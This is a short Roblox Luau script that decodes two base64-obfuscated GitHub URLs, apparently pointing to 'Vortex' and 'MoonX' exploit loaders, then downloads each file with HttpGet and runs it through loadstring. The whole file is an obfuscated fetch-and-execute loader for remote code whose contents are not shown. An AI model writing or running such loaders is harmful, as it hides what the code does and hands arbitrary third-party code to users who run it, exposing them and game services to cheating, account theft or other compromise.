local HttpService = game:GetService("HttpService")

-- Obfuscated (base64-encoded) URLs
local sources = {
    "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3Fvd2xvdy9Wb3J0ZXgvcmVmcy9oZWFkcy9tYWluL1dSQVA=",
    "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01hdGVvRGV2MjAyNC9Nb29uWC9yZWZzL2hlYWRzL21haW4vTG9hZGVyLmx1YQ=="
}

-- Loop through, decode, load and run
for _, b64 in ipairs(sources) do
    local url = HttpService:Base64Decode(b64)
    local scriptContent = game:HttpGet(url)
    loadstring(scriptContent)()
    wait(1)
end
